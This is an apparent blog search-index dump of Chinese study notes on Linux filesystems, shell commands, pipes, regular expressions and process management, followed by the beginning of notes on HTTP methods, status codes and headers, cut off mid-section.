可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。\n2. UEFI BIOS 不可以读取 GPT 分区表，而 UEFI 可以。\n四、文件系统 分区与文件系统 对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。\n组成 最主要的几个组成部分如下：\n inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。  除此之外还包括：\n superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位域。  文件读取 对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中去查找文件内容所在的所有 block，然后把所有 block 的内容读出来。\n而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。\n磁盘碎片 指一个文件内容所在的 block 过于分散。\nblock 在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。\n   大小 1KB 2KB 4KB     最大单一文件 16GB 256GB 2TB   最大文件系统 2TB 8TB 16TB    一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。\ninode inode 具体包含以下信息：\n 权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近一次的读取时间 (atime)； 最近修改的时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID\u0026hellip;； 该文件真正内容的指向 (pointer)。  inode 具有以下特点：\n 每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。  inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用是指，让 inode 记录的引用 block 块记录引用信息。\n目录 建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。\n可以看出文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的 w 权限有关。\n日志 如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。\next3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。\n挂载 挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。\n目录配置 为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：\n / (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。  五、文件 文件属性 用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。\n使用 ls 查看一个文件时，会显示一个文件的信息，例如 drwxr-xr-x. 3 root root 17 May 6 00:14 .config，对这个信息的解释如下：\n drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段 3：链接数 root：文件拥有者 root：所属群组 17：文件大小 May 6 00:14：文件最后被修改的时间 .config：文件名  常见的文件类型及其含义有：\n d：目录 -：文件 l：链接文件  9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。\n文件时间有以下三种：\n modification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。  文件与目录的基本操作 1. ls 列出文件或者目录的信息，目录的信息就是其中包含的文件。\n# ls [-aAdfFhilnrRSt] file|dir -a ：列出全部的文件 -d ：仅列出目录本身 -l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd 更换当前目录。\ncd [相对路径或绝对路径] 3. mkdir 创建目录。\n# mkdir [-mp] 目录名称 -m ：配置目录权限 -p ：递归创建目录 4. rmdir 删除目录，目录必须为空。\nrmdir [-p] 目录名称 -p ：递归删除目录 5. touch 更新文件时间或者建立新文件。\n# touch [-acdmt] filename -a ： 更新 atime -c ： 更新 ctime，若该文件不存在则不建立新文件 -m ： 更新 mtime -d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date=\u0026#34;日期或时间\u0026#34; -t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp 复制文件。\n如果源文件有两个以上，则目的文件一定要是目录才行。\ncp [-adfilprsu] source destination -a ：相当于 -dr --preserve=all 的意思，至于 dr 请参考下列说明 -d ：若来源文件为链接文件，则复制链接文件属性而非文件本身 -i ：若目标文件已经存在时，在覆盖前会先询问 -p ：连同文件的属性一起复制过去 -r ：递归持续复制 -u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制 --preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了 7. rm 删除文件。\n# rm [-fir] 文件或目录 -r ：递归删除 8. mv 移动文件。\n# mv [-fiu] source destination # mv [options] source1 source2 source3 .... directory -f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限 可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。\n# chmod [-R] xyz dirname/filename 示例：将 .bashrc 文件的权限修改为 -rwxr-xr\u0026ndash;。\n# chmod 754 .bashrc 也可以使用符号来设定权限。\n# chmod [ugoa] [+-=] [rwx] dirname/filename - u：拥有者 - g：所属群组 - o：其他人 - a：所有人 - +：添加权限 - -：移除权限 - =：设定权限 示例：为 .bashrc 文件的所有用户添加写权限。\n# chmod a+w .bashrc 文件默认权限  文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。  可以通过 umask 设置或者查看文件的默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r\u0026ndash;。\n目录的权限 文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。\n目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。\n链接 # ln [-sf] source_filename dist_filename -s ：默认是 hard link，加 -s 为 symbolic link -f ：如果目标文件存在时，先删除目标文件 1. 实体链接 在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。\n删除任意一个条目，文件还是存在，只要引用数量不为 0。\n有以下限制：不能跨越文件系统、不能对目录进行链接。\n# ln /etc/crontab . # ll -i /etc/crontab crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接 符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。\n当源文件被删除了，链接文件就打不开了。\n可以为目录建立链接。\n# ll -i /etc/crontab /root/crontab2 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -\u0026gt; /etc/crontab 获取文件内容 1. cat 取得文件内容。\n# cat [-AbEnTv] filename -n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac 是 cat 的反向操作，从最后一行开始打印。\n3. more 和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。\n4. less 和 more 类似，但是多了一个向前翻页的功能。\n5. head 取得文件前几行。\n# head [-n number] filename -n ：后面接数字，代表显示几行的意思 6. tail 是 head 的反向操作，只是取得是后几行。\n7. od 以字符或者十六进制的形式显示二进制文件。\n指令与文件搜索 1. which 指令搜索。\n# which [-a] command -a ：将所有指令列出，而不是只列第一个 2. whereis 文件搜索。速度比较快，因为它只搜索几个特定的目录。\n# whereis [-bmsu] dirname/filename 3. locate 文件搜索。可以用关键字或者正则表达式进行搜索。\nlocate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。\n# locate [-ir] keyword -r：正则表达式 4. find 文件搜索。可以使用文件的属性和权限进行搜索。\n# find [basedir] [option] example: find . -name \u0026#34;shadow*\u0026#34; ① 与时间有关的选项\n-mtime n ：列出在 n 天前的那一天修改过内容的文件 -mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件 -mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件 -newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下：\n② 与文件拥有者和所属群组有关的选项\n-uid n -gid n -user name -group name -nouser ：搜索拥有者不存在 /etc/passwd 的文件 -nogroup：搜索所属群组不存在于 /etc/group 的文件 ③ 与文件权限和名称有关的选项\n-name filename -size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k -type TYPE -perm mode ：搜索权限等于 mode 的文件 -perm -mode ：搜索权限包含 mode 的文件 -perm /mode ：搜索权限包含任一 mode 的文件 六、压缩与打包 压缩文件名 Linux 底下有很多压缩文件名，常见的如下：\n   扩展名 压缩程序     *.Z compress   *.zip zip   *.gz gzip   *.bz2 bzip2   *.xz xz   *.tar tar 程序打包的数据，没有经过压缩   *.tar.gz tar 程序打包的文件，经过 gzip 的压缩   *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩   *.tar.xz tar 程序打包的文件，经过 xz 的压缩    压缩指令 1. gzip gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。\n经过 gzip 压缩过，源文件就不存在了。\n有 9 个不同的压缩等级可以使用。\n可以使用 zcat、zmore、zless 来读取压缩文件的内容。\n$ gzip [-cdtv#] filename -c ：将压缩的数据输出到屏幕上 -d ：解压缩 -t ：检验压缩文件是否出错 -v ：显示压缩比等信息 -# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2 提供比 gzip 更高的压缩比。\n查看命令：bzcat、bzmore、bzless、bzgrep。\n$ bzip2 [-cdkzv#] filename -k ：保留源文件 3. xz 提供比 bzip2 更佳的压缩比。\n可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。\n查看命令：xzcat、xzmore、xzless、xzgrep。\n$ xz [-dtlkc#] filename 打包 压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gip、bzip2、xz 将打包文件进行压缩。\n$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩 $ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看 $ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩 -z ：使用 zip； -j ：使用 bzip2； -J ：使用 xz； -c ：新建打包文件； -t ：查看打包文件里面有哪些文件； -x ：解打包或解压缩的功能； -v ：在压缩/解压缩的过程中，显示正在处理的文件名； -f : filename：要处理的文件； -C 目录 ： 在特定目录解压缩。    使用方式 命令     打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称   查 看 tar -jtv -f filename.tar.bz2   解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录    七、Bash 可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。\n特性  命令历史：记录使用过的命令 命令与文件补全：快捷键：tab 命名别名：例如 lm 是 ls -al 的别名 shell scripts 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件  变量操作 对一个变量赋值直接使用 =。\n对变量取用需要在变量前加上 $ ，也可以用 ${} 的形式；\n输出变量使用 echo 命令。\n$ x=abc $ echo $x $ echo ${x} 变量内容如果有空格，必须使用双引号或者单引号。\n 双引号内的特殊字符可以保留原本特性，例如 x=\u0026quot;lang is $LANG\u0026rdquo;，则 x 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 x='lang is $LANG\u0026rsquo;，则 x 的值为 lang is $LANG。  可以使用 `指令` 或者 $(指令) 的方式将指令的执行结果赋值给变量。例如 version=$(uname -r)，则 version 的值为 4.15.0-22-generic。\n可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。\nBash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：\n$ declare [-aixr] variable -a ： 定义为数组类型 -i ： 定义为整数类型 -x ： 定义为环境变量 -r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作：\n$ array[1]=a $ array[2]=b $ echo ${array[1]} 指令搜索顺序  以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内置的指令来执行； 按 $PATH 变量指定的搜索路径的顺序找到第一个指令来执行。  数据流重定向 重定向指的是使用文件代替标准输入、标准输出和标准错误输出。\n   1 代码 运算符     标准输入 (stdin) 0 \u0026lt; 或 \u0026laquo;   标准输出 (stdout) 1 \u0026gt; 或 \u0026raquo;   标准错误输出 (stderr) 2 2\u0026gt; 或 2\u0026raquo;    其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。\n可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。\n如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2\u0026gt;\u0026amp;1 表示将标准错误输出转换为标准输出。\n$ find /home -name .bashrc \u0026gt; list 2\u0026gt;\u0026amp;1 八、管道指令 管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。\n在命令之间使用 | 分隔各个管道命令。\n$ ls -al /etc | less 提取指令 cut 对数据进行切分，取出想要的部分。\n切分过程一行一行地进行。\n$ cut -d ：分隔符 -f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间 -c ：以字符为单位取出区间 示例 1：last 显示登入者的信息，取出用户名。\n$ last root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33) root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16) $ last | cut -d \u0026#39; \u0026#39; -f 1 示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。\n$ export declare -x HISTCONTROL=\u0026#34;ignoredups\u0026#34; declare -x HISTSIZE=\u0026#34;1000\u0026#34; declare -x HOME=\u0026#34;/home/dmtsai\u0026#34; declare -x HOSTNAME=\u0026#34;study.centos.vbird\u0026#34; .....(其他省略)..... $ export | cut -c 12- 排序指令 sort 用于排序。\n$ sort [-fbMnrtuk] [file or stdin] -f ：忽略大小写 -b ：忽略最前面的空格 -M ：以月份的名字来排序，例如 JAN，DEC -n ：使用数字 -r ：反向排序 -u ：相当于 unique，重复的内容只出现一次 -t ：分隔符，默认为 tab -k ：指定排序的区间 示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。\n$ cat /etc/passwd | sort -t \u0026#39;:\u0026#39; -k 3 root:x:0:0:root:/root:/bin/bash dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash alex:x:1001:1002::/home/alex:/bin/bash arod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。\n$ uniq [-ic] -i ：忽略大小写 -c ：进行计数 示例：取得每个人的登录总次数\n$ last | cut -d \u0026#39; \u0026#39; -f 1 | sort | uniq -c 1 6 (unknown 47 dmtsai 4 reboot 7 root 1 wtmp 双向输出重定向 输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。\n$ tee [-a] file 字符转换指令 tr 用来删除一行中的字符，或者对字符进行替换。\n$ tr [-ds] SET1 ... -d ： 删除行中 SET1 这个字符串 示例，将 last 输出的信息所有小写转换为大写。\n$ last | tr \u0026#39;[a-z]\u0026#39; \u0026#39;[A-Z]\u0026#39; col 将 tab 字符转为空格字符。\n$ col [-xb] -x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。\n$ expand [-t] file -t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。\n$ join [-ti12] file1 file2 -t ：分隔符，默认为空格 -i ：忽略大小写的差异 -1 ：第一个文件所用的比较字段 -2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。\n$ paste [-d] file1 file2 -d ：分隔符，默认为 tab 分区指令 split 将一个文件划分成多个文件。\n$ split [-bl] file PREFIX -b ：以大小来进行分区，可加单位，例如 b, k, m 等 -l ：以行数来进行分区。 - PREFIX ：分区文件的前导名称 九、正则表达式 grep g/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。\n$ grep [-acinv] [--color=auto] 搜寻字符串 filename -c ： 统计个数 -i ： 忽略大小写 -n ： 输出行号 -v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行 --color=auto ：找到的关键字加颜色显示 示例：把含有 the 字符串的行提取出来（注意默认会有 \u0026ndash;color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）\n$ grep -n \u0026#39;the\u0026#39; regular_express.txt 8:I can\u0026#39;t finish the test. 12:the symbol \u0026#39;*\u0026#39; is represented as start. 15:You are the best is mean you are the no. 1. 16:The world Happy is the same with \u0026#34;glad\u0026#34;. 18:google is the best tools for search keyword 因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。\n$ grep -n \u0026#39;go\\{2,5\\}g\u0026#39; regular_express.txt printf 用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。\n$ printf \u0026#39;%10s %5i %5i %5i %8.2f \\n\u0026#39; $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk 是由 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。\nawk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：$n，n 为字段号，从 1 开始，$0 表示一整行。\n示例：取出最近五个登录用户的用户名和 IP\n$ last -n 5 dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22) dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12) dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14) dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15) $ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t\u0026#34; $3}\u0026#39; 可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。\n$ awk \u0026#39;条件类型 1 {动作 1} 条件类型 2 {动作 2} ...\u0026#39; filename 示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。\n$ cat /etc/passwd | awk \u0026#39;BEGIN {FS=\u0026#34;:\u0026#34;} $3 \u0026lt; 10 {print $1 \u0026#34;\\t \u0026#34; $3}\u0026#39; root 0 bin 1 daemon 2 awk 变量：\n   变量名称 代表意义     NF 每一行拥有的字段总数   NR 目前所处理的是第几行数据   FS 目前的分隔字符，默认是空格键    示例：显示正在处理的行号以及每一行有多少字段\n$ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t lines: \u0026#34; NR \u0026#34;\\t columns: \u0026#34; NF}\u0026#39; dmtsai lines: 1 columns: 10 dmtsai lines: 2 columns: 10 dmtsai lines: 3 columns: 10 dmtsai lines: 4 columns: 10 dmtsai lines: 5 columns: 9 十、进程管理 查看进程 1. ps 查看某个时间点的进程信息\n示例一：查看自己的进程\n# ps -l 示例二：查看系统所有进程\n# ps aux 示例三：查看特定的进程\n# ps aux | grep threadx 2. pstree 查看进程树\n示例：查看所有进程树\n# pstree -A 3. top 实时显示进程信息\n示例：两秒钟刷新一次\n# top -d 2 4. netstat 查看占用端口的进程\n示例：查看特定端口的进程\n# netstat -anp | grep port 进程状态    状态 说明     R running or runnable (on run queue)   D uninterruptible sleep (usually I/O)   S interruptible sleep (waiting for an event to complete)   Z zombie (terminated but not reaped by its parent)   T stopped (either by a job control signal or because it is being traced)        SIGCHLD 当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：\n 得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。  其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。\n在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。\nwait() pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。\n如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。\n参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。\nwaitpid() pid_t waitpid(pid_t pid, int *status, int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。\npid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。\noptions 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。\n孤儿进程 一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。\n孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。\n由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。\n僵尸进程 一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。\n僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。\n系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。\n要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 所收养，这样 init 就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。\n参考资料  鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009. Linux 平台上的软件包管理 Linux 之守护进程、僵死进程与孤儿进程 What is the difference between a symbolic link and a hard link? Linux process states GUID Partition Table 详解 wait 和 waitpid 函数 IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍 Akai IB-301S SCSI Interface for S2800,S3000 Parallel ATA ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed Decoding UCS Invicta – Part 1 硬盘 Difference between SAS and SATA BIOS File system design case studies Programming Project #4 FILE SYSTEM DESIGN  ","permalink":"https://www.fenghong.tech/blog/intro/linux/","tags":["vim","tar","linux"],"title":"linux"},{"categories":["ops"],"contents":"[TOC]\n一 、基础概念 URL URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。\n URI（Uniform Resource Identifier，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称）  请求和响应报文 1. 请求报文 2. 响应报文 二、HTTP 方法 客户端发送的 请求报文 第一行为请求行，包含了方法字段。\nGET  获取资源\n 当前网络请求中，绝大部分使用的是 GET 方法。\nHEAD  获取报文首部\n 和 GET 方法一样，但是不返回报文实体主体部分。\n主要用于确认 URL 的有效性以及资源更新的日期时间等。\nPOST  传输实体主体\n POST 主要用来传输数据，而 GET 主要用来获取资源。\n更多 POST 与 GET 的比较请见第九章。\nPUT  上传文件\n 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。\nPUT /new.html HTTP/1.1 Host: example.com Content-type: text/html Content-length: 16 \u0026lt;p\u0026gt;New File\u0026lt;/p\u0026gt; PATCH  对资源进行部分修改\n PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。\nPATCH /file.txt HTTP/1.1 Host: www.example.com Content-Type: application/example If-Match: \u0026#34;e0023aa4e\u0026#34; Content-Length: 100 [description of changes] DELETE  删除文件\n 与 PUT 功能相反，并且同样不带验证机制。\nDELETE /file.html HTTP/1.1 OPTIONS  查询支持的方法\n 查询指定的 URL 能够支持的方法。\n会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。\nCONNECT  要求在与代理服务器通信时建立隧道\n 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。\nCONNECT www.example.com:443 HTTP/1.1 TRACE  追踪路径\n 服务器会将通信路径返回给客户端。\n发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。\n通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。\n三、HTTP 状态码 服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。\n   状态码 类别 原因短语     1XX Informational（信息性状态码） 接收的请求正在处理   2XX Success（成功状态码） 请求正常处理完毕   3XX Redirection（重定向状态码） 需要进行附加操作以完成请求   4XX Client Error（客户端错误状态码） 服务器无法处理请求   5XX Server Error（服务器错误状态码） 服务器处理请求出错    1XX 信息  100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。  2XX 成功   200 OK\n  204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。\n  206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。\n  3XX 重定向   301 Moved Permanently ：永久性重定向\n  302 Found ：临时性重定向\n  303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。\n  注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。\n  304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。\n  307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。\n  4XX 客户端错误   400 Bad Request ：请求报文中存在语法错误。\n  401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。\n  403 Forbidden ：请求被拒绝。\n  404 Not Found\n  5XX 服务器错误   500 Internal Server Error ：服务器正在执行请求时发生错误。\n  503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\n  四、HTTP 首部 有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。\n各种首部字段及其含义如下（不需要全记，仅供查阅）：\n通用首部字段    首部字段名 说明     Cache-Control 控制缓存的行为   Connection 控制不再转发给代理的首部字段、管理持久连接   Date 创建报文的日期时间   Pragma 报文指令   Trailer 报文末端的首部一览   Transfer-Encoding 指定报文主体的传输编码方式   Upgrade 升级为其他协议   Via 代理服务器的相关信息   Warning 错误通知    请求首部字段    首部字段名 说明     Accept 用户代理可处理的媒体类型   Accept-Charset 优先的字符集   Accept-Encoding 优先的内容编码   Accept-Language 优先的语言（自然语言）   Authorization Web 认证信息   Expect 期待服务器的特定行为   From 用户的电子邮箱地址   Host 请求资源所在服务器   If-Match 比较实体标记（ETag）   If-Modified-Since 比较资源的更新时间   If-None-Match 比较实体标记（与 If-Match 相反）   If-Range 资源未更新时发送实体 Byte 的范围请求   If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反）   Max-Forwards 最大传输逐跳数   Proxy-Authorization 代理服务器要求客户端的认证信息   Range 实体的字节范围请求   Referer 对请求中 URI 的原始获取方   TE 传输编码的优先级   User-Agent HTTP 客户端程序的信息    响应首部字段    首部字段名 说明     Accept-Ranges 是否接受字节范围请求   Age 推算资源创建经过时间   ETag 资源的匹配信息   Location 令客户端重定向至指定 URI   Proxy-Authenticate 代理服务器对客户端的认证信息   Retry-After 对再次发起请求的时机要求   Server HTTP 服务器的安装信息   Vary 代理服务器缓存的管理信息   WWW-Authenticate 服务器对客户端的认证信息    实体首部字段    首部字段名 说明     Allow 资源可支持的 HTTP 方法   Content-Encoding 实体主体适用的编码方式   Content-Language 实体主体的自然语言   Content-Length 实体主体的大小   Content-Location 替代对应资源的 URI   Content-MD5 实体主体的报文摘要   Content-Range 实体主体的位置范围   Content-Type 实体主体的媒体类型   Expires 实体主体过期的日期时间   Last-Modified 资源的最后修改日期时间    五、具体应用 连接管理 1. 短连接与长连接 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 